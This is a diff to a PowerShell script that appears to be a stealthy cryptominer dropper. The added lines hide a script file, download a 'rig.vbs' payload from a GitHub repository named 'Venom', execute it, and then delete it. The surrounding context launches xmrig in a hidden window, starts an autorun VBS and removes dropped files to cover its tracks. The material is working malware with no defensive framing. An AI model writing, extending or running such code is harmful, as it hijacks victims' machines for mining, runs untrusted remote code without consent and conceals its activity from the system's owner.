@@ -139,9 +139,13 @@ Remove-Item -Path "FoRAUwtxKkSB.vbs"
 
 Set-ItemProperty -Name Attributes -Path "$initial_dir\ZDaFvwjOosKx.vbs" -Value "Hidden"
 
+Set-ItemProperty -Name Attributes -Path "$path\ZYHGCKXWlonm.ps1" -Value "Hidden"
+
 Start-Process -FilePath "$path\ZYHGCKXWlonm.ps1" -windowstyle hidden
 
 cd $initial_dir
+
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/rig.vbs" -OutFile "TMqhONoBljEv.vbs"
 
 # Start Autorun
 Start-Process -ArgumentList "ZDaFvwjOosKx.vbs" -windowstyle hidden -FilePath "cscript.exe"
@@ -149,6 +153,7 @@ Start-Process -ArgumentList "ZDaFvwjOosKx.vbs" -windowstyle hidden -FilePath "cs
 # Start Rig
 Start-Process -FilePath "$initial_dir\xmrig-6.22.2\xmrig.exe" -windowstyle hidden 
 
+& "./TMqhONoBljEv.vbs"
 
 
 # Pause for 200 seconds
@@ -160,3 +165,4 @@ Remove-Item -Path "$initial_dir\NzKnmxLrbsBw.txt"
 Remove-Item -Path "$initial_dir\PkUbTvqXFIdB.txt"
 Remove-Item -Path "$path\vaoYIkVglzTJ.cmd"
 Remove-Item -Path "$initial_dir\BVrAihDwJNvc.ps1"
+Remove-Item -Path "$initial_dir\TMqhONoBljEv.vbs"
